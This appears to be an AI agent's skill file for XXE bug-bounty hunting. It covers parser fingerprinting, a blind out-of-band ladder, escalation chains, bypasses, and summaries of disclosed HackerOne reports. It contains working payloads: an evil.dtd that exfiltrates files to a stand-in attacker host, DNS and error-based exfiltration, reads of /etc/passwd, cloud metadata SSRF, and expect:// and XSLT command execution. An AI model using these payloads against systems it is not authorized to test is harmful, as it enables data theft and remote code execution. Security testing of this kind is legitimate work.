---
name: hunt-xxe
description: XML external entity injection hunting — blind OOB ladder (inline entity → param-entity external DTD → two-stage file exfil), parser matrix (Java/PHP vulnerable by default, Python/.NET/Ruby safe), content-type swap, escalation chains (XXE→SSRF IMDS, XXE→LFI, XXE→RCE via expect/XSLT), CosmicSting CVE-2024-34102, bypasses (UTF-16, encoded schemes, XInclude). Use when XML/SOAP/SAML/DOCX/SVG upload surfaces exist. Trigger keywords: XXE, XML injection, external entity, DOCTYPE, parameter entity, XInclude.
---

# XML External Entity — Deep Hunting

## THE GATE
`application/xml`/SOAP/SAML/upload surfaces; missing `X-Content-Type-Options`; grep JS for `DOMParser`, `xml2js`, `libxmljs`. Content-type swap is free: POST XML to JSON endpoints.

## Parser Matrix (fingerprint BEFORE severity)
| Parser | Status |
|---|---|
| Java SAX/DOM/JAXB, PHP `DOMDocument`/`simplexml` + `LIBXML_NOENT` | Vulnerable by default |
| Python `xml.etree` ≥3.7.1, defusedxml | Safe |
| lxml 6.x | File-read-safe (verified) |
| .NET ≥4.5.2 `DtdProcessing.Prohibit` | Throws |
| Ruby Nokogiri | Safe unless `DTDLOAD` |

## Blind OOB Ladder
1. Inline entity probe: `<!ENTITY hello "world!">` → `&hello;` — if it echoes, parser is live.
2. Parameter-entity external DTD: `%dtd;` indirection in victim body.
3. Two-stage file exfil — hosted `evil.dtd`:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker/?data=%file;'>"> %all;
```

## Escalation Chains
- XXE→SSRF: IMDSv1 `http://169.254.169.254/latest/meta-data/`
- XXE→LFI: PHP `php://filter`, Java `netdoc://`, `jar:file://`
- XXE→RCE: PHP `expect://id`; Java XSLT `<xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>`
- **CosmicSting CVE-2024-34102**: nested deserialization → XXE reads `env.php` crypt-key → forge admin token → RCE.

## Bypasses
UTF-16 encoding, parameter entities, XML comments breaking signatures, `&#x66;&#x69;&#x6c;&#x65;` encoded scheme, chunked TE, DNS-only exfil (`http://%data;.attacker.com/`), error-based exfil (`file:///notexist/%file;`), **XInclude when DOCTYPE blocked**.

## Validation
Run inline-entity probe first — if no echo, parser is hardened, pivot. OOB-only DNS callback with no exfil = Low/Medium; Critical needs real file content or internal HTTP proof.

## Common Mistakes
Skipping the pre-severity parser fingerprint; wasting time on hardened parsers; claiming XXE on OOB callback alone without data exfil; assuming DOCX/SVG upload endpoints parse XML.

## PARAMETER COVERAGE — probe EVERY body field (MANDATORY)
The #1 miss: only testing endpoints that LOOK like XML (SOAP, explicit XML
endpoints) and skipping JSON/form endpoints and every upload field. Any body
value can be fed XML if the parser auto-detects content-type, and any upload
field can carry a DOCX/SVG/DOCM polyglot.

1. **Enumerate** every endpoint that accepts a body: JSON endpoints, form
   endpoints, upload endpoints (image/pdf/audio/import), GraphQL, SOAP.
2. **Content-type swap**: POST XML to JSON endpoints and vice versa; send
   `application/xml` bodies to fields that expect strings; test each field.
3. **On every XML-capable field run the ladder**:
   - inline entity probe: `<!DOCTYPE x [<!ENTITY e "world">]><x>&e;</x>`
   - external entity: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` / `http://<collab>`
   - parameter-entity OOB two-stage (`%dtd;` from hosted evil.dtd)
   - XInclude when DOCTYPE is blocked: `<xi:include href="file:///etc/passwd"/>`
   - encodings: UTF-16, `&#x66;&#x69;&#x6c;&#x65;`, entity-encoded schemes
4. **Upload fields**: test SVG (with `<image href>`/`<foreignObject>`), DOCX/XLSX
   (unzip → inject DTD into `[Content_Types].xml`/`word/document.xml`), DOCM
   (macro-enabled = also a polyglot vector), and audio-image import tools that
   parse metadata.
5. **OOB confirmation**: unique Collaborator sub-tag per field/sink; DNS-only
   callback with no exfil = low — escalate to real file content or internal
   HTTP proof before reporting.
6. **Track** `endpoint → field → technique → result` in the journal; every
   unlogged field = gap.

## FIELD DATA — mined from HackerOne disclosed reports (10k-report corpus)

### Class: xxe — 31 disclosed H1 reports (17 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `id`
- `EventAction`
- `EventDate`
- `_hxpage`
- `max_file_size_kb`
- `allow_file_type_list`
- `view_policy`
- `sentry_key`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] XXE in Site Audit function exposing file and directory contents** (XML External Entities (XXE))
  - Signal: **Summary:** The Project Site Audit function is vulnerable to XXE when parsing sitemap.xml files. **Description:** The Site Audit function spiders a given website and performs anal
- **[critical] XXE in Enterprise Search's App Search web crawler** (XML External Entities (XXE))
  - Signal: ## Summary Hello team! The latest version of Enterprise Search (7.12.0) is vulnerable to XXE when [parsing sitemaps](https://www.elastic.co/guide/en/app-search/current/crawl-web-co
- **[critical] [HTA2] XXE on https://███ via SpellCheck Endpoint.** (XML External Entities (XXE))
  - Signal: ## Summary: There is a full read XXE vulnerability on ## Steps To Reproduce: 1. Log into `https://██████/` with the credentials `██████` 2. Get your cookies and make the following 
- **[critical] XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx** (XML External Entities (XXE))
  - Signal: **Description:** Hi,guys,when i was visited the jobs of starbucks websites in China(https://ecjobs.starbucks.com.cn), i found a features of uploaded user's photo.Thought the bypass

